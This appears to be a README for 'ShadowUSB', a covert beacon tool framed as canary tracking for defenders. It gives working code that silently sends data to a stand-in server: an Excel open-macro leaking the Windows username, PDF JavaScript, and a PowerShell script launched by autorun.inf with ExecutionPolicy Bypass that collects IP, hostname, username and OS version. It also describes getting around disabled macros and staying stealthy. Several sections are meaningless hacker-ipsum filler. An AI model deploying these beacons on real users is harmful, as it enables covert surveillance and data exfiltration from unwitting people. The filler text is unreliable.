# ShadowUSB
ShadowUSB is a covert tracking tool designed to monitor and log interactions with untrusted documents and USB drives. By embedding beaconized documents, ShadowUSB tracks when and where files are accessed, offering valuable insights into unauthorized usage. Whether plugged into an unknown machine or opening potentially risky documents, ShadowUSB silently captures the event, providing detailed analytics on user behavior. Ideal for cybersecurity professionals and organizations looking to enhance their threat detection capabilities, ShadowUSB adds an extra layer of security by shedding light on otherwise invisible activities.

## Beaconizing the Doc's
Haxx0r ipsum ascii worm *.* rsa Leslie Lamport it's a feature echo memory leak syn race condition recursively. Packet break root Linus Torvalds case kilo bypass false bytes continue endif sql foad stdio.h pragma chown. Crack else blob infinite loop packet pwned float shell afk.

### Beaconizing Word
    Dereference class malloc semaphore flush emacs new fail bang ip root cache foo server port back door machine code baz Leslie Lamport hack the mainframe. Salt bar else break hexadecimal mailbomb ctl-c big-endian chown gobble man pages cd epoch double default thread. Gcc frack spoof ascii d00dz protocol tcp mutex headers while crack terminal fork private stack trace leapfrog script kiddies.

### Beaconizing Excel
Let's beaconize Excel. You'll need to have the developer tab in your ribbon for Excel.  Click VB, make sure you are in ThisWorkbook, and copy in this code.  Also don't forget to change yourwebserver.com/ to your web server address.

Visual Basic [VB]
```commandline
Private Sub Workbook_Open()
    Dim HttpReq As Object
    Set HttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    HttpReq.Open "GET", "http://yourwebserver.com/tracker?doc=excel&user=" & Environ("USERNAME"), False
    HttpReq.Send
End Sub
```
As you can guess... Most businesses/users would[SHOULD!] have macros disabled.  To bypass this we will use Excels "Get Data" feature and a hyperlink to our tracking web server.
```commandline
- In Excel, go to the "Data" tab and select "Get External Data."
- Choose "From Web" and enter your tracking URL, e.g., http://yourserver.com/track?doc=excel.
- This will trigger a request when the document is opened, but it might also prompt the user.
```
### Beaconizing PDFs

Here we will beaconize our PDFs.  I am using a combination of JavaScript and Tracking URLs.  I am doing this to try to keep things stealthy.  Usernames via web browsers are tricky but I can get IP Addresses and User Agent info that helps track the end user.

JavaScript Code:
```
var viewerApp = app.viewerType;
var viewerVersion = app.viewerVersion;
var user = app.response("Please enter your username:");


var url = "http://yourwebserver.com/tracker?doc=pdf&user=" + encodeURIComponent(user) + "&app=" + encodeURIComponent(viewerApp) + "&version=" + encodeURIComponent(viewerVersion);

app.launchURL(url, true);
```    
Tracking URL:
```commandline
http://yourserver.com/track?id=UniqueID12345
```
## Backend Tracker 
The tracker.py takes care of the back end tracking.  This is a WIP.  It is basic at the moment but tracks and logs to a track.log file.  It currently uses VB and JavaScript, I am working on making it more stealthy to the end user.

To launch the backend tracker:
```commandline
python tracker.py
or
python3 tracker.py
```
## USB Drive [Hardware] tracking
To track the actual USB drive we will use powershell and auto run.  You can do this with python as well. I may implement that later.  As for now powershell works great.

### Powershell Script for tracking[beaconizing] the physical USB drive.
This powershell script is pretty self explanitory.  It will give you the IP Address, Hostname, Username and OS Version of the user that inserted the drive.  Copy this script save it as tracker.ps1  For stealthiness store this tracker.ps1 and the autorun.inf file in a hidden folder on your ShadowUSB drive.
```commandline
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -eq (Get-NetIPConfiguration | Where-Object { $_.NetAdapter.Status -eq 'Up' }).InterfaceAlias } | Select-Object -First 1).IPAddress
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$os_version = (Get-WmiObject Win32_OperatingSystem).Version
$user_agent = "$hostname-$username-$os_version"

Invoke-WebRequest -Uri "http://yourwebserver.com/tracker?id=USBTracking&hostname=$hostname&ip=$ip&user=$username&os=$os_version" -UserAgent $user_agent
```

### Autorun via autorun.inf
You can use notepad copy this code and save it as autorun.inf
```commandline
[autorun]
open=powershell -ExecutionPolicy Bypass -File tracker.ps1
action=Run tracking script
label=USB Tracker
```